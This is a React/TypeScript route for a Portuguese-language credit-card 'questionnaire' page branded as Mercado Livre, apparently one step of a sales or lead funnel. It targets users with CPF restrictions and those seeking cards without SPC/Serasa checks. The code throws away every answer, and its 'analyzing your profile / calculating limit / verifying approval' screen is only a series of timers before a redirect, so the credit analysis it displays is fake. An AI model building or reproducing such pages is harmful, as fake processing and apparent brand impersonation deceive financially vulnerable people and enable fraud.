import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { FunnelSteps } from "@/components/FunnelSteps";
import { SiteFooter } from "@/components/SiteFooter";

export const Route = createFileRoute("/questionario")({
  head: () => ({
    meta: [
      { title: "Questionário - Mercado Livre" },
      { name: "description", content: "Responda algumas perguntas para encontrarmos a melhor oferta de cartão para você." },
    ],
    links: [
      { rel: "stylesheet", href: "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" },
    ],
  }),
  component: Questionario,
});

type Option = { label: string; icon?: string };
type Step = {
  question: string;
  options: Option[];
  columns?: 1 | 2;
};

const steps: Step[] = [
  {
    question: "O que é mais importante para você em um cartão de crédito?",
    columns: 2,
    options: [
      { label: "Limite alto", icon: "fa-money-bill" },
      { label: "Crédito imediato", icon: "fa-bolt" },
      { label: "Não consultar SPC/Serasa", icon: "fa-ban" },
      { label: "Sem anuidade", icon: "fa-calendar-check" },
    ],
  },
  {
    question: "Em qual grupo você se encaixa?",
    columns: 1,
    options: [
      { label: "Empreendedor" },
      { label: "Carteira assinada" },
      { label: "Desempregado" },
      { label: "Aposentado" },
      { label: "Servidor público" },
      { label: "Estudante" },
      { label: "Autônomo" },
    ],
  },
  {
    question: "Qual sua renda mensal?",
    columns: 1,
    options: [
      { label: "Até R$ 1.000" },
      { label: "Entre R$ 1.000 e R$ 2.000" },
      { label: "Entre R$ 2.000 e R$ 4.000" },
      { label: "Acima de R$ 4.000" },
    ],
  },
  {
    question: "Você tem restrições no CPF?",
    columns: 2,
    options: [
      { label: "Sim" },
      { label: "Não" },
    ],
  },
];

function Questionario() {
  const navigate = useNavigate();
  const [current, setCurrent] = useState(0);
  const [analyzing, setAnalyzing] = useState(false);
  const [progressSteps, setProgressSteps] = useState(0);

  const totalSteps = steps.length;
  const progress = analyzing ? 100 : Math.round(((current) / totalSteps) * 100);

  const handleSelect = (_label: string) => {
    if (current + 1 < totalSteps) {
      setCurrent(current + 1);
    } else {
      setAnalyzing(true);
    }
  };

  useEffect(() => {
    if (!analyzing) return;
    const t1 = setTimeout(() => setProgressSteps(1), 2500);
    const t2 = setTimeout(() => setProgressSteps(2), 5500);
    const t3 = setTimeout(() => setProgressSteps(3), 8500);
    const t4 = setTimeout(() => setProgressSteps(4), 11500);
    const t5 = setTimeout(() => navigate({ to: "/calculando" }), 13500);
    return () => {
      [t1, t2, t3, t4, t5].forEach(clearTimeout);
    };
  }, [analyzing, navigate]);


  const step = steps[current];

  return (
    <div className="min-h-screen bg-white flex flex-col relative overflow-hidden">
      {/* Header */}
      <FunnelSteps current={1} />

      {/* Decorative circles */}
      <div className="absolute w-72 h-72 rounded-full bg-[#FFE600]/20 -top-20 -right-20 z-0" />
      <div className="absolute w-56 h-56 rounded-full bg-[#FFE600]/10 -bottom-16 -left-16 z-0" />

      <main className="flex-1 flex items-start justify-center px-4 py-8 relative z-10">
        <div className="w-full max-w-md bg-white rounded-xl shadow-md p-6 md:p-8">
          {/* Progress bar */}
          <div className="w-full h-1.5 bg-gray-200 rounded-full mb-6 overflow-hidden">
            <div
              className="h-full bg-[#FFE600] transition-all duration-500"
              style={{ width: `${progress}%` }}
            />
          </div>

          {!analyzing ? (
            <>
              <h2 className="text-lg md:text-xl font-bold text-gray-800 text-center mb-6">
                {step.question}
              </h2>

              <div className="flex flex-col gap-3">
                {step.options.map((opt) => (
                  <button
                    key={opt.label}
                    onClick={() => handleSelect(opt.label)}
                    className="border border-gray-200 rounded-lg p-4 flex items-center gap-3 text-left hover:border-[#FFE600] hover:bg-[#FBE74D] transition-all"
                  >
                    {opt.icon && (
                      <span className="w-11 h-11 rounded-lg bg-[#FFE600] flex items-center justify-center shrink-0">
                        <i className={`fas ${opt.icon} text-gray-800 text-lg`} />
                      </span>
                    )}
                    <span className="text-sm font-semibold text-gray-800">
                      {opt.label}
                    </span>
                  </button>
                ))}
              </div>

            </>
          ) : (
            <div className="py-2">
              <div className="flex justify-center mb-4">
                <div className="w-16 h-16 rounded-2xl bg-gradient-to-br from-[#3483FA] to-[#1E5BBA] flex items-center justify-center shadow-lg shadow-[#3483FA]/30">
                  <i className="fas fa-credit-card text-white text-2xl" />
                </div>
              </div>
              <h2 className="text-lg md:text-xl font-bold text-gray-800 text-center mb-2">
                Analisando suas respostas...
              </h2>
              <p className="text-sm text-gray-600 text-center mb-6">
                Estamos processando suas informações para encontrar a melhor oferta de cartão para você.
              </p>

              <div className="space-y-3">
                {[
                  { label: "Validando perfil", icon: "fa-user-check", emoji: "👤" },
                  { label: "Calculando limite", icon: "fa-calculator", emoji: "💳" },
                  { label: "Verificando aprovação", icon: "fa-shield-halved", emoji: "🔒" },
                  { label: "Finalizando análise", icon: "fa-clipboard-check", emoji: "✨" },
                ].map((item, idx) => {
                  const done = progressSteps > idx;
                  const active = progressSteps === idx;
                  return (
                    <div
                      key={item.label}
                      className={`flex items-center gap-3 p-3 rounded-lg border ${
                        done
                          ? "border-[#3483FA] bg-[#EAF2FE]"
                          : active
                          ? "border-[#3483FA] bg-[#EAF2FE]"
                          : "border-gray-200 bg-gray-50"
                      }`}
                    >
                      <span
                        className={`w-9 h-9 rounded-lg flex items-center justify-center shrink-0 ${
                          done || active ? "bg-[#3483FA]" : "bg-gray-200"
                        }`}
                      >
                        <i className={`fas ${item.icon} ${done || active ? "text-white" : "text-gray-800"} text-sm`} />
                      </span>
                      <span className="flex-1 text-sm font-medium text-gray-800 flex items-center gap-2">
                        {item.label}
                        {active && <span className="text-base animate-bounce">{item.emoji}</span>}
                      </span>
                      {done ? (
                        <span className="w-6 h-6 rounded-full bg-[#3483FA] flex items-center justify-center">
                          <i className="fas fa-check text-white text-xs" />
                        </span>
                      ) : active ? (
                        <i className="fas fa-spinner fa-spin text-[#3483FA]" />
                      ) : (
                        <span className="text-xs text-gray-500">Aguardando</span>
                      )}
                    </div>
                  );
                })}
              </div>

            </div>
          )}
        </div>
      </main>

      <SiteFooter />
    </div>
  );
}
